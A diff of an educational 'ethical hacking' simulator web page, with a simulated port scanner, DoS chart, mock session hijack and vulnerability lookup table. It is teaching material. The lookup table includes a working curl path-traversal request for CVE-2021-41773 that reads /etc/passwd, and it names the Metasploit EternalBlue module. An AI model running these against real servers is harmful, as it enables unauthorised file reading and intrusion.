+            <h3 class="text-xl font-bold mb-3 text-red-400">⚠️ Legal & Ethical Warning</h3>
+            <p class="text-sm text-red-300 mb-3">
+                All skills demonstrated in this simulator are for <strong>authorized testing only</strong>. In ethical hacking:
+            </p>
+            <ul class="list-disc list-inside space-y-2 text-sm text-red-200">
+                <li>Only scan devices you OWN or have <strong>written permission</strong> to test</li>
+                <li>Use virtual labs (like VMware) for practice - never attack real systems</li>
+                <li>Participate in legal platforms like HackTheBox, TryHackMe, or bug bounty programs</li>
+                <li>Unauthorized hacking is a <strong>serious crime</strong> with real prison sentences</li>
+            </ul>
+            <p class="text-sm text-red-300 mt-3 font-semibold">
+                "With great power comes great responsibility. Stay in the sandbox - VMware exists so you never have to attack real systems." 🛡️
+            </p>
+        </section>
+    </main>
+
+    <!-- Footer -->
+    <footer class="bg-gray-800 border-t border-gray-700 py-6">
+        <div class="container mx-auto px-4 text-center text-sm text-gray-400">
+            <p>Ethical Hacking Course - Interactive Learning Simulator | IT & Cybersecurity Education</p>
+            <p class="mt-1 text-gray-600">Educational purposes only. Always practice legally!</p>
+        </div>
+    </footer>
+
+    <!-- JavaScript -->
+    <script>
+    // ========================================
+    // Global Variables and Initialization
+    // ========================================
+    let dosChart = null;
+    let dosAttackRunning = false;
+    let dosTimer = null;
+    let dosData = { times: [], responses: [] };
+    let networkChart = null;
+    let scanResultsData = [];
+    let sessionHijacked = false;
+
+    // Service database for vulnerability analysis
+    const serviceDatabase = {
+        Apache: {
+            defaultVersion: '2.4.49',
+            versions: {
+                '2.4.49': {
+                    vulns: ['CVE-2021-41773: Path Traversal & RCE'],
+                    risk: 'Critical',
+                    exploit: 'curl -s --path-as-is "http://target/cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd"'
+                },
+                '2.4.50': {
+                    vulns: ['CVE-2021-42013: Path Traversal bypass'],
+                    risk: 'High',
+                    exploit: 'Apache 2.4.50 still vulnerable to request smuggling'
+                },
+                '2.4.53': {
+                    vulns: ['No known critical vulnerabilities'],
+                    risk: 'Low',
+                    exploit: 'No publicly known exploits for this version'
+                }
+            }
+        },
+        OpenSSH: {
+            defaultVersion: '7.2p1',
+            versions: {
+                '7.2p1': {
+                    vulns: ['Username enumeration', 'Weak key exchange algorithms'],
+                    risk: 'Medium',
+                    exploit: 'Use nmap SSH enumeration scripts'
+                },
+                '8.0p1': {
+                    vulns: ['Potential DoS via malformed packets'],
+                    risk: 'Low',
+                    exploit: 'Limited exploit surface'
+                },
+                '8.9p1': {
+                    vulns: ['No known critical vulnerabilities'],
+                    risk: 'Low',
+                    exploit: 'No publicly known exploits'
+                }
+            }
+        },
+        SMB: {
+            defaultVersion: 'EternalBlue',
+            versions: {
+                'EternalBlue': {
+                    vulns: ['MS17-010: EternalBlue Remote Code Execution'],
+                    risk: 'Critical',
+                    exploit: 'Metasploit exploit/windows/smb/ms17_010_eternalblue'
+                },
+                'Patched': {
+                    vulns: ['SMB signing not enforced'],
+                    risk: 'Medium',
+                    exploit: 'Man-in-the-middle SMB relay attacks'
+                },
+                'Secure': {
+                    vulns: ['SMBv1 still enabled'],
+                    risk: 'Low',
+                    exploit: 'Potential legacy protocol attacks'
+                }
+            }
+        },
+        MySQL: {
+            defaultVersion: '5.5',
+            versions: {
+                '5.5': {
+                    vulns: ['Default root password', 'Older auth vulnerabilities'],
+                    risk: 'High',
+                    exploit: 'mysql -u root -p -- password blank or weak'
+                },
+                '5.7': {
+                    vulns: ['CVE-2017-3599: Unknown privilege escalation'],
+                    risk: 'Medium',
+                    exploit: 'Requires valid credentials first'
+                },
+                '8.0': {
+                    vulns: ['No known critical vulnerabilities'],
+                    risk: 'Low',
+                    exploit: 'No publicly known exploits'
+                }
+            }
+        }
+    };
+
+    // Port database for scan simulation
+    const portDatabase = {
+        21: { service: 'FTP', description: 'File Transfer Protocol', risk: 'Medium' },
+        22: { service: 'SSH', description: 'Secure Shell', risk: 'Low' },
+        23: { service: 'Telnet', description: 'Telnet (unencrypted)', risk: 'High' },
+        25: { service: 'SMTP', description: 'Simple Mail Transfer', risk: 'Low' },
+        53: { service: 'DNS', description: 'Domain Name System', risk: 'Low' },
+        80: { service: 'HTTP', description: 'Web Server', risk: 'Medium' },
+        110: { service: 'POP3', description: 'Email Retrieval', risk: 'Low' },
+        135: { service: 'RPC', description: 'Remote Procedure Call', risk: 'High' },
+        139: { service: 'NetBIOS', description: 'NetBIOS Session', risk: 'High' },
+        143: { service: 'IMAP', description: 'Email Access', risk: 'Low' },
+        443: { service: 'HTTPS', description: 'Secure Web', risk: 'Low' },
+        445: { service: 'SMB', description: 'Windows File Sharing', risk: 'High' },
+        1521: { service: 'Oracle', description: 'Oracle Database', risk: 'High' },
+        3306: { service: 'MySQL', description: 'MySQL Database', risk: 'High' },
+        3389: { service: 'RDP', description: 'Remote Desktop', risk: 'High' },
+        5432: { service: 'PostgreSQL', description: 'PostgreSQL Database', risk: 'Medium' },
+        5900: { service: 'VNC', description: 'Virtual Network Computing', risk: 'High' }
+    };
+
+    // ========================================
+    // Utility Functions
+    // ========================================
+    function formatNumber(num) {
+        try {
+            if (typeof num !== 'number') {
+                num = parseInt(num) || 0;
+            }
+            return num.toLocaleString('en-US');
+        } catch (error) {
+            console.error('Error formatting number:', error);
+            return String(num || 0);
+        }
+    }
+
+    function debounce(func, wait) {
+        let timeout;
+        return function executedFunction(...args) {
+            try {
+                const later = () => {
+                    clearTimeout(timeout);
+                    func(...args);
+                };
+                clearTimeout(timeout);
+                timeout = setTimeout(later, wait);
+            } catch (error) {
+                console.error('Debounce error:', error);
+                func(...args);
+            }
+        };
+    }
+
+    function isValidIP(ip) {
+        try {
+            if (typeof ip !== 'string') return false;
+            const parts = ip.split('.');
+            if (parts.length !== 4) return false;
+            return parts.every(part => {
+                const num = parseInt(part, 10);
+                return num >= 0 && num <= 255 && !isNaN(num) && String(num) === part;
+            });
+        } catch (error) {
+            console.error('IP validation error:', error);
+            return false;
+        }
+    }
+
+    // ========================================
+    // Tab Management
+    // ========================================
+    document.querySelectorAll('.tab-btn').forEach(btn => {
+        btn.addEventListener('click', function() {
+            try {
+                const tabId = this.dataset.tab;
+                // Update button styles
+                document.querySelectorAll('.tab-btn').forEach(b => {
+                    b.classList.remove('bg-green-600', 'hover:bg-green-700');
+                    b.classList.add('bg-gray-700', 'hover:bg-gray-600');
+                });
+                this.classList.add('bg-green-600', 'hover:bg-green-700');
+                this.classList.remove('bg-gray-700', 'hover:bg-gray-600');
+                
+                // Show selected panel
+                document.querySelectorAll('.tab-panel').forEach(panel => {
+                    panel.classList.remove('active-panel');
+                    panel.classList.add('hidden-panel');
+                });
+                const activePanel = document.getElementById(tabId);
+                if (activePanel) {
+                    activePanel.classList.remove('hidden-panel');
+                    activePanel.classList.add('active-panel');
+                }
+                
+                // Handle chart re-rendering for DoS tab
+                if (tabId === 'dos-sim') {
+                    setTimeout(() => {
+                        try {
+                            initializeDoSChart();
+                        } catch (error) {
+                            console.error('Error initializing DoS chart:', error);
+                        }
+                    }, 100);
+                }
+            } catch (error) {
+                console.error('Tab switch error:', error);
+            }
+        });
+    });
+
+    // ========================================
+    // Network Visualization Tab
+    // ========================================
+    const networkCanvas = document.getElementById('network-map');
+    let networkNodes = [];
+
+    function drawNetwork() {
+        try {
+            const canvas = networkCanvas;
+            if (!canvas) {
+                console.error('Network canvas not found');
+                return;
+            }
+            const ctx = canvas.getContext('2d');
+            const width = canvas.clientWidth;
+            const height = canvas.clientHeight;
+            
+            // Set canvas dimensions
+            canvas.width = width;
+            canvas.height = height;
+            ctx.clearRect(0, 0, width, height);
+            
+            // Node positions
+            const attackerPos = { x: 80, y: 150 };
+            const firewallPos = { x: 220, y: 150 };
+            const routerPos = { x: 360, y: 150 };
+            const targetPos = { x: 500, y: 150 };
+            
+            // Draw connection lines
+            ctx.strokeStyle = '#4a5568';
+            ctx.lineWidth = 2;
+            ctx.setLineDash([5, 5]);
+            
+            // Attacker to Firewall
+            ctx.beginPath();
+            ctx.moveTo(attackerPos.x + 30, attackerPos.y);
+            ctx.lineTo(firewallPos.x - 30, firewallPos.y);
+            ctx.stroke();
+            
+            // Firewall to Router
+            ctx.beginPath();
+            ctx.moveTo(firewallPos.x + 30, firewallPos.y);
+            ctx.lineTo(routerPos.x - 30, routerPos.y);
+            ctx.stroke();
+            
+            // Router to Target
+            ctx.beginPath();
+            ctx.moveTo(routerPos.x + 30, routerPos.y);
+            ctx.lineTo(targetPos.x - 30, targetPos.y);
+            ctx.stroke();
+            
+            ctx.setLineDash([]);
+            
+            // Draw nodes
+            // Attacker
+            drawNode(ctx, attackerPos.x, attackerPos.y, '#ef4444', '🥷', 'Attacker');
+            
+            // Firewall (color based on strength)
+            const firewallStrength = document.getElementById('firewall-strength').value;
+            const firewallColor = firewallStrength > 70 ? '#10b981' : firewallStrength > 30 ? '#f59e0b' : '#ef4444';
+            drawNode(ctx, firewallPos.x, firewallPos.y, firewallColor, '🛡️', 'Firewall');
+            
+            // Router
+            drawNode(ctx, routerPos.x, routerPos.y, '#3b82f6', '📡', 'Router');
+            
+            // Target
+            const securityLevel = getSecurityLevel();
+            const targetColor = securityLevel < 0.3 ? '#ef4444' : securityLevel < 0.7 ? '#f59e0b' : '#10b981';
+            drawNode(ctx, targetPos.x, targetPos.y, targetColor, '💻', 'Target');
+            
+        } catch (error) {
+            console.error('Draw network error:', error);
+        }
+    }
+
+    function drawNode(ctx, x, y, color, icon, label) {
+        try {
+            // Draw circle
+            ctx.beginPath();
+            ctx.arc(x, y, 25, 0, Math.PI * 2);
+            ctx.fillStyle = color;
+            ctx.fill();
+            ctx.strokeStyle = '#fff';
+            ctx.lineWidth = 2;
+            ctx.stroke();
+            
+            // Draw icon
+            ctx.font = '20px serif';
+            ctx.textAlign = 'center';
+            ctx.textBaseline = 'middle';
+            ctx.fillText(icon, x, y);
+            
+            // Draw label
+            ctx.font = '12px sans-serif';
+            ctx.fillStyle = '#e2e8f0';
+            ctx.textAlign = 'center';
+            ctx.fillText(label, x, y + 42);
+        } catch (error) {
+            console.error('Draw node error:', error);
+        }
+    }
+
+    function getSecurityLevel() {
+        try {
+            const firewall = parseInt(document.getElementById('firewall-strength').value) || 30;
+            const patch = parseInt(document.getElementById('patch-level').value) || 60;
+            const servicesOpen = computeOpenServices();
+            
+            // Security level is combination of firewall + patch + services
+            let security = (firewall / 100) * 0.4 + (patch / 100) * 0.4;
+            const serviceFactor = 1 - (servicesOpen.length * 0.15);
+            security = Math.max(0, Math.min(1, security + serviceFactor - 0.3));
+            
+            return security;
+        } catch (error) {
+            console.error('Security level calculation error:', error);
+            return 0.5;
+        }
+    }
+
+    function computeOpenServices() {
+        try {
+            const services = [];
+            if (document.getElementById('service-http') && document.getElementById('service-http').checked) services.push('HTTP');
+            if (document.getElementById('service-ssh') && document.getElementById('service-ssh').checked) services.push('SSH');
+            if (document.getElementById('service-smb') && document.getElementById('service-smb').checked) services.push('SMB');
+            if (document.getElementById('service-ftp') && document.getElementById('service-ftp').checked) services.push('FTP');
+            
+            console.log('Open services:', services);
+            return services;
+        } catch (error) {
+            console.error('Compute services error:', error);
+            return [];
+        }
+    }
+
+    function updateNetworkVisualization() {
+        try {
+            const firewall = parseInt(document.getElementById('firewall-strength').value) || 30;
+            const patch = parseInt(document.getElementById('patch-level').value) || 60;
+            
+            // Update labels
+            document.getElementById('firewall-value').textContent = firewall;
+            document.getElementById('patch-value').textContent = patch;
+            
+            const services = computeOpenServices();
+            const security = getSecurityLevel();
+            
+            // Calculate attack success probability
+            let successProb = 100;
+            successProb -= (firewall * 0.5);
+            successProb -= (patch * 0.5);
+            successProb -= (services.length * 5);
+            successProb = Math.max(10, Math.min(95, successProb));
+            
+            // Update probability bar
+            const probBar = document.getElementById('success-probability');
+            if (probBar) {
+                probBar.style.width = successProb + '%';
+                probBar.style.backgroundColor = successProb > 70 ? '#10b981' : successProb > 40 ? '#f59e0b' : '#ef4444';
+            }
+            
+            const successText = document.getElementById('success-text');
+            if (successText) {
+                if (successProb > 70) {
+                    successText.textContent = 'High probability - easy target, poor security posture';
+                } else if (successProb > 40) {
+                    successText.textContent = 'Medium probability - some security controls exist';
+                } else {
+                    successText.textContent = 'Low probability - well-defended target';
+                }
+            }
+            
+            drawNetwork();
+        } catch (error) {
+            console.error('Update network visualization error:', error);
+        }
+    }
+
+    // Event listeners for network controls
+    const firewallSlider = document.getElementById('firewall-strength');
+    const patchSlider = document.getElementById('patch-level');
+    
+    if (firewallSlider) {
+        firewallSlider.addEventListener('input', debounce(() => updateNetworkVisualization(), 50));
+    }
+    if (patchSlider) {
+        patchSlider.addEventListener('input', debounce(() => updateNetworkVisualization(), 50));
+    }
+    
+    document.querySelectorAll('.service-toggle').forEach(toggle => {
+        toggle.addEventListener('change', () => updateNetworkVisualization());
+    });
+
+    // ========================================
+    // Nmap Simulator Tab
+    // ========================================
+    function runScan() {
+        try {
+            const resultsContainer = document.getElementById('scan-results');
+            if (!resultsContainer) {
+                console.error('Scan results container not found');
+                return;
+            }
+            
+            resultsContainer.innerHTML = '<div class="text-sm text-gray-400 animate-pulse">Scanning target... Please wait.</div>';
+            
+            // Get scan parameters
+            const targetIP = document.getElementById('target-ip').value;
+            const portStart = parseInt(document.getElementById('port-start').value) || 1;
+            const portEnd = parseInt(document.getElementById('port-end').value) || 1024;
+            const scanType = document.querySelector('input[name="scan-type"]:checked')?.value || 'SYN';
+            const serviceDetection = document.getElementById('service-detection').checked;
+            const osDetection = document.getElementById('os-detection').checked;
+            
+            // Validate input
+            if (!isValidIP(targetIP)) {
+                throw new Error('Invalid IP address format');
+            }
+            if (portStart < 1 || portEnd > 65535 || portStart > portEnd) {
+                throw new Error('Invalid port range');
+            }
+            
+            // Build command display
+            let command = `${targetIP} -s${scanType === 'UDP' ? 'U' : scanType === 'TCP' ? 'T' : 'S'} `;
+            if (serviceDetection) command += '-sV ';
+            if (osDetection) command += '-O ';
+            command += `-p ${portStart}-${portEnd}`;
+            document.getElementById('command-display').textContent = command;
+            
+            // Simulate scan with delay
+            setTimeout(() => {
+                try {
+                    let openPorts = [];
+                    let scanResultsHTML = '';
+                    
+                    // Determine which ports are open based on scan type
+                    const openChance = scanType === 'UDP' ? 0.4 : 0.7;
+                    const availablePorts = portEnd - portStart + 1;
+                    
+                    // Sample ports to keep results manageable
+                    const sampleSize = Math.min(availablePorts, 1000);
+                    const step = Math.max(1, Math.floor(availablePorts / sampleSize));
+                    
+                    for (let port = portStart; port <= portEnd; port += step) {
+                        // Common ports have higher chance of being open
+                        const isCommonPort = portDatabase[port] !== undefined;
+                        const chance = isCommonPort ? 0.9 : openChance * 0.3;
+                        
+                        if (Math.random() < chance) {
+                            openPorts.push(port);
+                        }
+                    }
+                    
+                    // Sort ports
+                    openPorts.sort((a, b) => a - b);
+                    
+                    if (openPorts.length === 0) {
+                        scanResultsHTML = '<div class="text-sm text-gray-400 italic">No open ports found on this target.</div>';
+                    } else {
+                        scanResultsHTML = '<div class="text-xs font-mono text-gray-500 mb-2">PORT     STATE  SERVICE</div>';
+                        
+                        openPorts.forEach(port => {
+                            const portInfo = portDatabase[port] || { service: 'unknown', description: 'Unknown service', risk: 'Low' };
+                            const riskColor = portInfo.risk === 'High' ? 'text-red-400' : portInfo.risk === 'Medium' ? 'text-yellow-400' : 'text-green-400';
+                            const stateColor = scanType === 'UDP' ? 'text-yellow-400' : 'text-green-400';
+                            
+                            scanResultsHTML += `<div class="flex justify-between items-center text-sm py-1 border-b border-gray-700 last:border-0">
+                                <span class="font-mono text-blue-400">${port}/tcp${scanType === 'UDP' ? 'udp' : ''}</span>
+                                <span class="${stateColor}">open</span>
+                                <span class="${riskColor} text-xs">${portInfo.service}</span>
+                                ${serviceDetection ? `<span class="text-xs text-gray-400">${portInfo.description}</span>` : ''}
+                            </div>`;
+                        });
+                    }
+                    
+                    // Add OS detection result
+                    if (osDetection) {
+                        const osResults = ['Linux 4.15', 'Windows Server 2019', 'Linux 5.4', 'Cisco IOS'];
+                        const detectedOS = osResults[Math.floor(Math.random() * osResults.length)];
+                        document.getElementById('os-detected').textContent = detectedOS;
+                        scanResultsHTML += `<div class="text-sm mt-3 pt-2 border-t border-gray-700">
+                            <span class="text-purple-400 font-semibold">OS:</span> <span class="font-mono">${detectedOS}</span>
+                            <span class="text-gray-500 text-xs"> (accuracy: 87%)</span>
+                        </div>`;
+                    }
+                    
+                    // Update results
+                    resultsContainer.innerHTML = scanResultsHTML;
+                    
+                    // Update statistics
+                    document.getElementById('hosts-up').textContent = '1';
+                    document.getElementById('ports-open').textContent = openPorts.length;
+                    document.getElementById('services-found').textContent = serviceDetection ? openPorts.length : '-';
+                    if (!osDetection) {
+                        document.getElementById('os-detected').textContent = '-';
+                    }
+                    
+                    // Store results for export
+                    scanResultsData = {
+                        target: targetIP,
+                        scanType: scanType,
+                        ports: openPorts,
+                        services: openPorts.map(p => portDatabase[p]?.service || 'unknown'),
+                        timestamp: new Date().toISOString()
+                    };
+                    
+                    console.log('Scan completed:', scanResultsData);
+                    
+                } catch (error) {
+                    console.error('Scan execution error:', error);
+                    resultsContainer.innerHTML = `<div class="text-sm text-red-400">Scan failed: ${error.message}</div>`;
+                }
+            }, 1500);
+            
+        } catch (error) {
+            console.error('Run scan error:', error);
+            const resultsContainer = document.getElementById('scan-results');
+            if (resultsContainer) {
+                resultsContainer.innerHTML = `<div class="text-sm text-red-400">Error: ${error.message}</div>`;
+            }
+        }
+    }
+
+    // Scan button click handler
+    const runScanBtn = document.getElementById('run-scan-btn');
+    if (runScanBtn) {
+        runScanBtn.addEventListener('click', () => {
+            try {
+                runScan();
+            } catch (error) {
+                console.error('Scan button error:', error);
+                alert('Error running scan. Please check your input.');
+            }
+        });
+    }
+
+    // Export scan results
+    const exportScanBtn = document.getElementById('export-scan');
+    if (exportScanBtn) {
+        exportScanBtn.addEventListener('click', () => {
+            try {
+                if (!scanResultsData || scanResultsData.ports.length === 0) {
+                    alert('No scan results to export. Run a scan first.');
+                    return;
+                }
+                
+                let exportText = 'Nmap Scan Report\n';
+                exportText += '================\n';
+                exportText += `Target: ${scanResultsData.target}\n`;
+                exportText += `Scan Type: ${scanResultsData.scanType}\n`;
+                exportText += `Timestamp: ${scanResultsData.timestamp}\n\n`;
+                exportText += 'Open Ports:\n';
+                scanResultsData.ports.forEach((port, index) => {
+                    const service = portDatabase[port]?.service || 'unknown';
+                    exportText += `  ${port}/tcp  open  ${service}\n`;
+                });
+                
+                const blob = new Blob([exportText], { type: 'text/plain' });
+                const url = window.URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = 'scan-report.txt';
+                a.click();
+                window.URL.revokeObjectURL(url);
+                
+            } catch (error) {
+                console.error('Export error:', error);
+                alert('Error exporting results.');
+            }
+        });
+    }
+
+    // ========================================
+    // DoS Attack Simulator
+    // ========================================
+    function initializeDoSChart() {
+        try {
+            const chartCanvas = document.getElementById('dos-chart');
+            if (!chartCanvas) {
+                console.error('DoS chart canvas not found');
+                return;
+            }
+            
+            // Destroy existing chart if it exists
+            if (dosChart) {
+                dosChart.destroy();
+            }
+            
+            // Initialize data
+            const labels = [];
+            const responseData = [];
+            const packetsData = [];
+            for (let i = 0; i < 30; i++) {
+                labels.push(`${i}s`);
+                responseData.push(Math.random() * 50 + 20);
+                packetsData.push(0);
+            }
+            
+            dosChart = new Chart(chartCanvas, {
+                type: 'line',
+                data: {
+                    labels: labels,
+                    datasets: [
+                        {
+                            label: 'Server Response Time (ms)',
+                            data: responseData,
+                            borderColor: '#10b981',
+                            backgroundColor: 'rgba(16, 185, 129, 0.1)',
+                            fill: true,
+                            tension: 0.4
+                        },
+                        {
+                            label: 'Packets/sec',
+                            data: packetsData,
+                            borderColor: '#ef4444',
+                            backgroundColor: 'rgba(239, 68, 68, 0.1)',
+                            fill: true,
+                            tension: 0.4,
+                            yAxisID: 'y1'
+                        }
+                    ]
+                },
+                options: {
+                    responsive: true,
+                    maintainAspectRatio: false,
+                    interaction: {
+                        mode: 'index',
+                        intersect: false
+                    },
+                    scales: {
+                        y: {
+                            beginAtZero: true,
+                            position: 'left',
+                            grid: {
+                                color: 'rgba(255, 255, 255, 0.1)'
+                            },
+                            ticks: {
+                                color: '#a0aec0'
+                            }
+                        },
+                        y1: {
+                            beginAtZero: true,
+                            position: 'right',
+                            grid: {
+                                drawOnChartArea: false
+                            },
+                            ticks: {
+                                color: '#a0aec0',
+                                callback: function(value) {
+                                    return formatNumber(value);
+                                }
+                            }
+                        },
+                        x: {
+                            grid: {
+                                color: 'rgba(255, 255, 255, 0.1)'
+                            },
+                            ticks: {
+                                color: '#a0aec0'
+                            }
+                        }
+                    },
+                    plugins: {
+                        legend: {
+                            labels: {
+                                color: '#e2e8f0'
+                            }
+                        }
+                    }
+                }
+            });
+            
+            console.log('DoS chart initialized');
+            
+        } catch (error) {
+            console.error('Initialize DoS chart error:', error);
+        }
+    }
+
+    function updateAttackControls() {
+        try {
+            const intensity = parseInt(document.getElementById('attack-intensity').value) || 1000;
+            const capacity = parseInt(document.getElementById('server-capacity').value) || 2000;
+            const duration = parseInt(document.getElementById('attack-duration').value) || 15;
+            
+            document.getElementById('intensity-value').textContent = formatNumber(intensity);
+            document.getElementById('capacity-value').textContent = formatNumber(capacity);
+            document.getElementById('duration-value').textContent = duration;
+            
+        } catch (error) {
+            console.error('Update attack controls error:', error);
+        }
+    }
+
+    function startAttack() {
+        try {
+            if (dosAttackRunning) {
+                console.warn('Attack already running');
+                return;
+            }
+            
+            dosAttackRunning = true;
+            
+            const intensity = parseInt(document.getElementById('attack-intensity').value) || 1000;
+            const capacity = parseInt(document.getElementById('server-capacity').value) || 2000;
+            const duration = parseInt(document.getElementById('attack-duration').value) || 15;
+            const attackType = document.querySelector('input[name="attack-type"]:checked')?.value || 'DoS';
+            
+            const statusEl = document.getElementById('attack-status');
+            const progressBar = document.getElementById('attack-progress-bar');
+            
+            if (!statusEl || !progressBar) {
+                console.error('Attack status elements not found');
+                dosAttackRunning = false;
+                return;
+            }
+            
+            statusEl.textContent = `⚔️ ${attackType} attack launched! ${formatNumber(intensity)} packets/sec flooding target...`;
+            statusEl.className = 'text-sm text-red-300 font-semibold';
+            
+            // Disable attack button
+            document.getElementById('start-attack-btn').disabled = true;
+            document.getElementById('start-attack-btn').classList.add('opacity-50', 'cursor-not-allowed');
+            
+            // Reset chart data
+            if (dosChart) {
+                dosChart.data.datasets[0].data = Array(30).fill(null).map(() => Math.random() * 50 + 20);
+                dosChart.data.datasets[1].data = Array(30).fill(0);
+            }
+            
+            // Track elapsed time
+            let elapsedTime = 0;
+            const baseResponseTime = 50; // Base response time
+            let degraded = false;
+            
+            dosTimer = setInterval(() => {
+                try {
+                    elapsedTime++;
+                    
+                    // Calculate progress
+                    const progress = Math.min(100, (elapsedTime / duration) * 100);
+                    progressBar.style.width = progress + '%';
+                    
+                    // Update chart with new data
+                    if (dosChart) {
+                        const responseTime = Math.min(1000, baseResponseTime + (intensity / capacity) * 500 * (elapsedTime / 20));
+                        const packetCount = intensity * (0.8 + Math.random() * 0.4);
+                        
+                        dosChart.data.datasets[0].data.push(responseTime);
+                        dosChart.data.datasets[0].data.shift();
+                        dosChart.data.datasets[1].data.push(packetCount);
+                        dosChart.data.datasets[1].data.shift();
+                        dosChart.update('none');
+                        
+                        // Update status indicators
+                        const serverStatus = document.getElementById('server-status-now');
+                        const packetLoss = document.getElementById('packet-loss');
+                        const responseTimeEl = document.getElementById('response-time');
+                        
+                        if (serverStatus && packetLoss && responseTimeEl) {
+                            if (responseTime > 800) {
+                                serverStatus.textContent = '🔴';
+                                serverStatus.className = 'text-2xl font-bold text-red-500';
+                                packetLoss.textContent = '80%';
+                                responseTimeEl.textContent = `${Math.round(responseTime)}ms`;
+                                
+                                if (!degraded) {
+                                    degraded = true;
+                                    statusEl.textContent = '💥 Target is unresponsive! Server completely overwhelmed.';
+                                    console.log('Target became unresponsive at:', elapsedTime, 'seconds');
+                                }
+                            } else if (responseTime > 400) {
+                                serverStatus.textContent = '🟡';
+                                serverStatus.className = 'text-2xl font-bold text-yellow-500';
+                                packetLoss.textContent = '30%';
+                                responseTimeEl.textContent = `${Math.round(responseTime)}ms`;
+                            } else {
+                                serverStatus.textContent = '🟢';
+                                serverStatus.className = 'text-2xl font-bold text-green-500';
+                                packetLoss.textContent = '0%';
+                                responseTimeEl.textContent = `${Math.round(responseTime)}ms`;
+                            }
+                        }
+                    }
+                    
+                    // Check if attack duration is complete
+                    if (elapsedTime >= duration) {
+                        clearInterval(dosTimer);
+                        dosTimer = null;
+                        dosAttackRunning = false;
+                        
+                        // Re-enable attack button
+                        document.getElementById('start-attack-btn').disabled = false;
+                        document.getElementById('start-attack-btn').classList.remove('opacity-50', 'cursor-not-allowed');
+                        
+                        statusEl.textContent = `Attack finished. Target ${degraded ? 'was brought down' : 'remained responsive'} during the ${duration} second test.`;
+                        statusEl.className = 'text-sm text-green-400';
+                        
+                        // Reset progress bar
+                        setTimeout(() => {
+                            progressBar.style.width = '0%';
+                        }, 2000);
+                        
+                        console.log('Attack completed. Target down:', degraded);
+                    }
+                    
+                } catch (error) {
+                    console.error('Attack loop error:', error);
+                    clearInterval(dosTimer);
+                    dosTimer = null;
+                    dosAttackRunning = false;
+                }
+            }, 1000);
+            
+        } catch (error) {
+            console.error('Start attack error:', error);
+            dosAttackRunning = false;
+            // Re-enable attack button
+            const btn = document.getElementById('start-attack-btn');
+            if (btn) {
+                btn.disabled = false;
+                btn.classList.remove('opacity-50', 'cursor-not-allowed');
+            }
+        }
+    }
+
+    function resetAttack() {
+        try {
+            // Clear timer
+            if (dosTimer) {
+                clearInterval(dosTimer);
+                dosTimer = null;
+            }
+            dosAttackRunning = false;
+            
+            // Re-enable attack button
+            const btn = document.getElementById('start-attack-btn');
+            if (btn) {
+                btn.disabled = false;
+                btn.classList.remove('opacity-50', 'cursor-not-allowed');
+            }
+            
+            // Reset status
+            const statusEl = document.getElementById('attack-status');
+            if (statusEl) {
+                statusEl.textContent = 'Ready. Press start to begin attack.';
+                statusEl.className = 'text-sm text-gray-400';
+            }
+            
+            // Reset progress bar
+            document.getElementById('attack-progress-bar').style.width = '0%';
+            
+            // Reset indicators
+            document.getElementById('server-status-now').textContent = '🟢';
+            document.getElementById('server-status-now').className = 'text-2xl font-bold text-green-500';
+            document.getElementById('packet-loss').textContent = '0%';
+            document.getElementById('response-time').textContent = '0ms';
+            
+            // Reset chart
+            if (dosChart) {
+                dosChart.data.datasets[0].data = Array(30).fill(null).map(() => Math.random() * 50 + 20);
+                dosChart.data.datasets[1].data = Array(30).fill(0);
+                dosChart.update();
+            }
+            
+            console.log('Attack reset');
+            
+        } catch (error) {
+            console.error('Reset attack error:', error);
+        }
+    }
+
+    // Attack control event listeners
+    const attackBtn = document.getElementById('start-attack-btn');
+    const resetBtn = document.getElementById('reset-attack-btn');
+    
+    if (attackBtn) {
+        attackBtn.addEventListener('click', () => {
+            try {
+                if (!dosAttackRunning) {
+                    startAttack();
+                }
+            } catch (error) {
+                console.error('Attack button error:', error);
+                alert('Error starting attack.');
+            }
+        });
+    }
+    
+    if (resetBtn) {
+        resetBtn.addEventListener('click', resetAttack);
+    }
+    
+    // Update labels on range changes
+    ['attack-intensity', 'server-capacity', 'attack-duration'].forEach(id => {
+        const el = document.getElementById(id);
+        if (el) {
+            el.addEventListener('input', updateAttackControls);
+        }
+    });
+
+    // ========================================
+    // Session Hijacking
+    // ========================================
+    const hijackBtn = document.getElementById('hijack-session-btn');
+    const resetSessionBtn = document.getElementById('reset-session-btn');
+    const hijackResult = document.getElementById('hijack-result');
+    
+    if (hijackBtn) {
+        hijackBtn.addEventListener('click', () => {
+            try {
+                const stolenCookie = document.getElementById('stolen-cookie-input').value;
+                
+                // Simple validation - check if it contains session-like content
+                if (!stolenCookie || stolenCookie.trim() === '') {
+                    alert('Please paste a stolen cookie first.');
+                    return;
+                }
+                
+                if (stolenCookie.includes('session_id') || stolenCookie.includes('auth_token')) {
+                    // Successful hijack
+                    sessionHijacked = true;
+                    hijackResult.classList.remove('hidden');
+                    resetSessionBtn.classList.remove('hidden');
+                    hijackBtn.classList.add('hidden');
+                    
+                    console.log('Session hijacked successfully');
+                } else {
+                    alert('Invalid session cookie format. Try copying the victim\'s cookie from the left panel.');
+                }
+                
+            } catch (error) {
+                console.error('Session hijack error:', error);
+                alert('Error during session hijacking.');
+            }
+        });
+    }
+    
+    if (resetSessionBtn) {
+        resetSessionBtn.addEventListener('click', () => {
+            try {
+                sessionHijacked = false;
+                hijackResult.classList.add('hidden');
+                resetSessionBtn.classList.add('hidden');
+                hijackBtn.classList.remove('hidden');
+                document.getElementById('stolen-cookie-input').value = '';
+                
+                console.log('Session reset');
+                
+            } catch (error) {
+                console.error('Session reset error:', error);
+            }
+        });
+    }
+
+    // ========================================
+    // Vulnerability Analyzer
+    // ========================================
+    const vulnServiceSelect = document.getElementById('vuln-service');
+    const vulnVersionSelect = document.getElementById('vuln-version');
+    const vulnOptionsDiv = document.getElementById('vuln-options');
+    const analyzeVulnBtn = document.getElementById('analyze-vuln-btn');
+    
+    if (vulnServiceSelect) {
+        vulnServiceSelect.addEventListener('change', () => {
+            try {
+                const service = vulnServiceSelect.value;
+                let versions;
+                
+                switch(service) {
+                    case 'Apache':
+                        versions = ['2.4.49', '2.4.50', '2.4.53'];
+                        break;
+                    case 'OpenSSH':
+                        versions = ['7.2p1', '8.0p1', '8.9p1'];
+                        break;
+                    case 'SMB':
+                        versions = ['EternalBlue', 'Patched', 'Secure'];
+                        break;
+                    case 'MySQL':
+                        versions = ['5.5', '5.7', '8.0'];
+                        break;
+                    default:
+                        versions = ['Version 1'];
+                }
+                
